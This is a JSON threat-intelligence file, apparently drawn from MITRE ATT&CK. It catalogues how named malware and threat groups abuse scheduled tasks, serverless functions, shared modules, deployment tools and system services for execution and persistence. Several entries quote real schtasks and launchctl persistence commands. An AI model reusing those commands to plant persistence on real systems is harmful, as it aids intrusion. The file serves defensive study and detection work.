                        "Description": "During <name>, the threat actors established persistence through a scheduled task using the command: /Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR, named \"WinUpdate\" [73]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> established persistence for PoisonIvy by created a scheduled task.[74]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has created scheduled tasks to launch executables after a designated number of minutes have passed.[75][76][77]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> can establish persistence by creating a scheduled task.[78][79]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has used scheduled tasks to maintain persistence.[80]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to maintain persistence by creating scheduled tasks set to run every hour.[14]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "<name> creates a scheduled task to ensure it is re-executed everyday.[81]"
                    },
                    "S0417": {
                        "ID": "S0417",
                        "Name": "GRIFFON",
                        "Description": "<name> has used sctasks for persistence. [82]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> has the ability to set persistence using the Task Scheduler.[83]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> has used a scheduled task for persistence.[84]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to use scheduled tasks for execution.[85]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used a scheduled task to establish persistence for a keylogger.[86]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> dropped and added officeupdate.exe to scheduled tasks.[87][88]"
                    },
                    "S0431": {
                        "ID": "S0431",
                        "Name": "HotCroissant",
                        "Description": "<name> has attempted to install a scheduled task named \"Java Maintenance64\" on startup to establish persistence.[89]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has created a scheduled task that executes every hour to establish persistence.[90]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> has used scheduled tasks named MSST and \\Microsoft\\Windows\\Autochk\\Scheduled to establish persistence.[91]"
                    },
                    "S0581": {
                        "ID": "S0581",
                        "Name": "IronNetInjector",
                        "Description": "<name> has used a task XML file named mssch.xml to run an IronPython script when a user logs in or when specific system events are created.[92]"
                    },
                    "S0189": {
                        "ID": "S0189",
                        "Name": "ISMInjector",
                        "Description": "<name> creates scheduled tasks to establish persistence.[93]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> has registered itself as a scheduled task to run each time the current user logs in.[94][95]"
                    },
                    "S0648": {
                        "ID": "S0648",
                        "Name": "JSS Loader",
                        "Description": "<name> has the ability to launch scheduled tasks to establish persistence.[96]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has downloaded additional malware with scheduled tasks.[97]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> has used scheduled tasks to add persistence.[98]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.[99][100]"
                    },
                    "S0680": {
                        "ID": "S0680",
                        "Name": "LitePower",
                        "Description": "<name> can create a scheduled task to enable persistence mechanisms.[101]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script.[102]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F.[103]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has created scheduled tasks to establish persistence for their tools.[104]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "The different components of <name> are executed by Windows Task Scheduler.[105][106]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has created scheduled tasks to maintain <name>'s persistence.[107]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used scheduled tasks to establish persistence and execution.[108][109]"
                    },
                    "S0167": {
                        "ID": "S0167",
                        "Name": "Matryoshka",
                        "Description": "<name> can establish persistence by adding a Scheduled Task named \"Microsoft Boost Kernel Optimization\".[110][111]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has created scheduled tasks using name variants such as \"Windows Update Security\", \"Windows Update Security Patches\", and \"Google Chrome Security Update\", to launch <name> at a specific time.[112]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> can use scheduled tasks for persistence.[113]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.[114]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> execution begins from a scheduled task named Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll and it creates a separate scheduled task called mstask to run the wiper only once at 23:55:00.[115]"
                    },
                    "S1015": {
                        "ID": "S1015",
                        "Name": "Milan",
                        "Description": "<name> can establish persistence on a targeted host with scheduled tasks.[116][117]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has created scheduled tasks to persistently run VBScripts.[118]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used scheduled tasks to establish persistence.[119]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has created a scheduled task to execute additional malicious software, as well as maintain persistence.[120][121][122]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has used schtasks.exe for lateral movement in compromised networks.[123]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> can create a scheduled task to establish persistence.[124]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> creates a task to reboot the system one hour after infection.[125]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has created scheduled tasks that run a VBScript to execute a payload on victim machines.[126][127][128][129]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name>'s installer can attempt to achieve persistence by creating a scheduled task.[130]"
                    },
                    "S0264": {
                        "ID": "S0264",
                        "Name": "OopsIE",
                        "Description": "<name> creates a scheduled task to run itself every three minutes.[126][131]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.[132]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script.[133]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.[134]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "A <name> file stealer can run a TaskScheduler DLL to add persistence.[135]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s New-UserPersistenceOption Persistence argument can be used to establish via a Scheduled Task/Job.[136][137]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> has established persistence through a scheduled task using the command \"C:\\Windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe\".[138]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> persists through a scheduled task that executes it every minute.[139]"
                    },
                    "S1058": {
                        "ID": "S1058",
                        "Name": "Prestige",
                        "Description": "<name> has been executed on a target system through a scheduled task created by Sandworm Team using Impacket.[140]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> schedules tasks to invoke its components in order to establish persistence.[141][142]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has the ability to create scheduled tasks for persistence.[143][144][145][146][147][148][149][150]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> creates a scheduled task to maintain persistence on the victim\u2019s machine.[127]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "<name> contains a .NET wrapper DLL for creating and managing scheduled tasks for maintaining persistence upon reboot.[151][152]"
                    },
                    "S0629": {
                        "ID": "S0629",
                        "Name": "RainyDay",
                        "Description": "<name> can use scheduled tasks to achieve persistence.[123]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> can schedule tasks via the Windows COM API to maintain persistence.[153]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> launched a scheduled task to gain persistence using the schtasks /create /sc command.[154]"
                    },
                    "S0375": {
                        "ID": "S0375",
                        "Name": "Remexi",
                        "Description": "<name> utilizes scheduled tasks as a persistence mechanism.[155]"
                    },
                    "S0166": {
                        "ID": "S0166",
                        "Name": "RemoteCMD",
                        "Description": "<name> can execute commands remotely by creating a new schedule task on the remote system[156]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> schedules tasks to run malicious scripts at different intervals.[157]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> tries to add a scheduled task to establish persistence.[158][159]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> can remotely create a scheduled task to execute itself on a system.[160]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has created a scheduled task named \"Maintenance\" to establish persistence.[161]"
                    },
                    "S0111": {
                        "ID": "S0111",
                        "Name": "schtasks",
                        "Description": "<name> is used to schedule tasks on a Windows system to run at a specific date and time.[162]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> contains modules that will use schtasks to carry out malicious operations.[163]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> copies an executable payload to the target system by using SMB/Windows Admin Shares and then scheduling an unnamed task to execute the malware.[164][165]"
                    },
                    "S1089": {
                        "ID": "S1089",
                        "Name": "SharpDisco",
                        "Description": "<name> can create scheduled tasks to execute reverse shells that read and write data to and from specified SMB shares.[55]"
                    },
                    "S0546": {
                        "ID": "S0546",
                        "Name": "SharpStage",
                        "Description": "<name> has a persistence component to write a scheduled task for the payload.[166]"
                    },
                    "S0589": {
                        "ID": "S0589",
                        "Name": "Sibot",
                        "Description": "<name> has been executed via a scheduled task.[80]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used scheduled tasks to stage its operation.[167]"
                    },
                    "S0226": {
                        "ID": "S0226",
                        "Name": "Smoke Loader",
                        "Description": "<name> launches a scheduled task.[168]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used scheduler and schtasks to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted.[169][170][171]"
                    },
                    "S0516": {
                        "ID": "S0516",
                        "Name": "SoreFang",
                        "Description": "<name> can gain persistence through use of scheduled tasks.[172]"
                    },
                    "S0390": {
                        "ID": "S0390",
                        "Name": "SQLRat",
                        "Description": "<name> has created scheduled tasks in %appdata%\\Roaming\\Microsoft\\Templates\\.[69]"
                    },
                    "G0038": {
                        "ID": "G0038",
                        "Name": "Stealth Falcon",
                        "Description": "<name> malware creates a scheduled task entitled \"IE Web Cache\" to execute a malicious file hourly.[173]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> schedules a network job to execute two minutes after host infection.[174]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "<name> has created scheduled tasks called MicrosoftInternetExplorerCrashRepoeterTaskMachineUA and MicrosoftEdgeCrashRepoeterTaskMachineUA, which were configured to execute CrashReporter.exe during user logon.[175]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> can create a scheduled task named RecoveryExTask to gain persistence.[176]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used scheduled tasks to establish persistence for installed tools.[177]"
                    },
                    "S1011": {
                        "ID": "S1011",
                        "Name": "Tarrask",
                        "Description": "<name> is able to create \"hidden\" scheduled tasks for persistence.[3]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used scheduled tasks to execute discovery commands and scripts for collection.[178]"
                    },
                    "S0671": {
                        "ID": "S0671",
                        "Name": "Tomiris",
                        "Description": "<name> has used SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00 to establish persistence.[179]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> creates a scheduled task on the system that provides persistence.[180][181][182]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles installed scheduled tasks defined in XML files.[183]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has used scheduled tasks to execute additional payloads and to gain persistence on a compromised host.[184][185][186]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used scheduled tasks to establish persistence for TrickBot and other malware.[187][188][189][190][191]"
                    },
                    "S0248": {
                        "ID": "S0248",
                        "Name": "yty",
                        "Description": "<name> establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR \" + path_file + \"/ST 09:30\".[192]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> has a command to create a scheduled task for persistence.[193]"
                    },
                    "S0350": {
                        "ID": "S0350",
                        "Name": "zwShell",
                        "Description": "<name> has used SchTasks for execution.[194]"
                    },
                    "S1013": {
                        "ID": "S1013",
                        "Name": "ZxxZ",
                        "Description": "<name> has used scheduled tasks for persistence and execution.[32]"
                    }
                }
            },
            "006": {
                "name": "Systemd Timers",
                "href": "/techniques/T1053/006",
                "description": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension .timer that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments.[1] Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH.[2]Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service. .service files are Systemd Service unit files that are managed by the systemd system and service manager.[3] Privileged timers are written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are written to ~/.config/systemd/user/.An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.[4][5][6] Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.[7]",
                "Procedure": {}
            },
            "007": {
                "name": "Container Orchestration Job",
                "href": "/techniques/T1053/007",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.[1][2] An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.[3]",
                "Procedure": {}
            }
        },
        "tactic": "Execution",
        "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
        "Procedure": {
            "S1052": {
                "ID": "S1052",
                "Name": "DEADEYE",
                "Description": "malware has used the scheduled tasks \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared to establish persistence.[3]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR \"[file path]\" /ru system for persistence.[4]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware's second stage DLL has set a timer using \"timeSetEvent\" to schedule its next execution.[5]"
            },
            "S0125": {
                "ID": "S0125",
                "Name": "Remsec",
                "Description": "malware schedules the execution one of its modules by creating a new scheduler task.[6]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware has create a scheduled task named Mozilla\\Firefox Default Browser Agent 409046Z0FF4A39CB for persistence.[7]"
            }
        }
    },
    "T1648": {
        "ttp_name": "Serverless Execution",
        "ttp_id": "T1648",
        "href": "/techniques/T1648",
        "tactic": "Execution",
        "description": "Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. Adversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking).[1] Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the IAM:PassRole permission in AWS or the iam.serviceAccounts.actAs permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot.[2][3]Serverless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created.[4] Similarly, an adversary may create a Power Automate workflow in Office 365 environments that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint.[5][6]",
        "Procedure": {
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can create malicious Lambda functions.[7]"
            }
        }
    },
    "T1129": {
        "ttp_name": "Shared Modules",
        "ttp_id": "T1129",
        "href": "/techniques/T1129",
        "tactic": "Execution",
        "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., Native API).Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in dlfcn.h in functions such as dlopen and dlsym. Although macOS can execute .so files, common practice uses .dylib files.[1][2][3][4]The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like LoadLibrary at run time.[5]",
        "Procedure": {
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware uses the LoadLibraryExW() function to load additional modules. [6]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware's dispatcher can execute additional plugins by loading the respective DLLs.[7]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has loaded and executed DLLs in memory during runtime on a victim machine.[8]"
            },
            "S0415": {
                "ID": "S0415",
                "Name": "BOOSTWRITE",
                "Description": "malware has used the DWriteCreateFactory() function to load additional modules.[9]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can use LoadLibrary to attempt to execute GdiPlus.dll.[10]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can load DLLs.[11]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware contains a function that calls LoadLibrary and GetProcAddress.[12]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware's loader can call the load() function to load the malware dll into an Application Domain on a compromised AD FS server.[13]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware can load DLLs into memory.[14]"
            },
            "S0203": {
                "ID": "S0203",
                "Name": "Hydraq",
                "Description": "malware creates a backdoor through which remote attackers can load and call DLL functions.[15][16]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware loads and executes functions from a DLL.[17]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware had used AutoIt to load and execute the DLL payload.[18]"
            },
            "S0352": {
                "ID": "S0352",
                "Name": "OSX_OCEANLOTUS.D",
                "Description": "For network communications, malware loads a dynamic library (.dylib file) using dlopen() and obtains a function pointer to execute within that shared library using dlsym().[4]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware has used call to LoadLibrary to load its installer. malware loads its modules using reflective loading or custom shellcode.[19]"
            },
            "S0196": {
                "ID": "S0196",
                "Name": "PUNCHBUGGY",
                "Description": "malware can load a DLL using the LoadLibrary API.[20]"
            },
            "S1078": {
                "ID": "S1078",
                "Name": "RotaJakiro",
                "Description": "malware uses dynamically linked shared libraries (.so files) to execute additional functionality using dlopen() and dlsym().[3]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware calls LoadLibrary then executes exports from a DLL.[21]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to inject the LoadLibrary call template DLL into running processes.[22]"
            }
        }
    },
    "T1072": {
        "ttp_name": "Software Deployment Tools",
        "ttp_id": "T1072",
        "href": "/techniques/T1072",
        "tactic": "Execution",
        "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.SaaS-based configuration management services may allow for broad Cloud Administration Command on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.[1] Such services may also utilize Web Protocols to communicate back to adversary owned infrastructure.[2]Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.[3]The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
        "Procedure": {
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware compromised McAfee ePO to move laterally by distributing malware as a software deployment task.[4]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors used PDQ Deploy to move AvosLocker and tools across the network.[5]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used the commercially available tool RemoteExec for agentless remote code execution.[6]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has used RAdmin, a remote software tool used to remotely control workstations and ATMs.[7]"
            },
            "G0028": {
                "ID": "G0028",
                "Name": "Threat Group-1314",
                "Description": "malware actors used a victim's endpoint management platform, Altiris, for lateral movement.[8]"
            },
            "S0041": {
                "ID": "S0041",
                "Name": "Wiper",
                "Description": "It is believed that a patch management system for an anti-virus product commonly installed among targeted companies was used to distribute the malware malware.[9]"
            }
        }
    },
    "T1569": {
        "ttp_name": "System Services",
        "ttp_id": "T1569",
        "href": "/techniques/T1569",
        "subtechnique": {
            "001": {
                "name": "Launchctl",
                "href": "/techniques/T1569/001",
                "description": "Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.[1]Adversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: launchctl load,launchctl unload, and launchctl start. Adversaries can use scripts or manually run the commands launchctl load -w \"%s/Library/LaunchAgents/%s\" or /bin/launchctl load to execute Launch Agents or Launch Daemons.[2][3]",
                "Procedure": {
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has loaded a plist file using the launchctl command.[4]"
                    },
                    "S0274": {
                        "ID": "S0274",
                        "Name": "Calisto",
                        "Description": "<name> uses launchctl to enable screen sharing on the victim\u2019s machine.[5]"
                    },
                    "S0451": {
                        "ID": "S0451",
                        "Name": "LoudMiner",
                        "Description": "<name> launched the QEMU services in the /Library/LaunchDaemons/ folder using launchctl. It also uses launchctl to unload all Launch Daemons when updating to a newer version of <name>.[6]"
                    },
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> has used launchctl to restart the Launch Agent.[7]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> loads a system level launchdaemon using the launchctl load -w command from /System/Librarby/LaunchDaemons/ssh.plist.[8]"
                    }
                }
            },
            "002": {
                "name": "Service Execution",
                "href": "/techniques/T1569/002",
                "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services.[1] The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.PsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.[2] Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
                "Procedure": {
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> can create and execute services to load its payload.[3][4]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name>'s backdoor has used Windows services as a way to execute its malicious payload. [5]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has created new services or modified existing ones to run executables, commands, or scripts.[6]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used post-exploitation tools including RemCom and the Non-sucking Service Manager (NSSM) to execute processes.[7][8]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used  svchost.exe and Net to execute a system service installed to launch a Cobalt Strike BEACON loader.[9][10]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s dispatcher can be executed as a service.[11]"
                    },
                    "S0606": {
                        "ID": "S0606",
                        "Name": "Bad Rabbit",
                        "Description": "<name> drops a file named infpub.datinto the Windows directory and is executed through SCManager and rundll.exe."
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> can start, stop, or delete services.[12]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has executed custom-compiled XMRIG miner DLLs by configuring them to execute via the \"wercplsupport\" service.[13]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can create Windows system services for execution.[14]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used PsExec to deploy beacons on compromised systems.[15]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can create and start services on a compromised host.[16]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services.[17][18][19]"
                    },
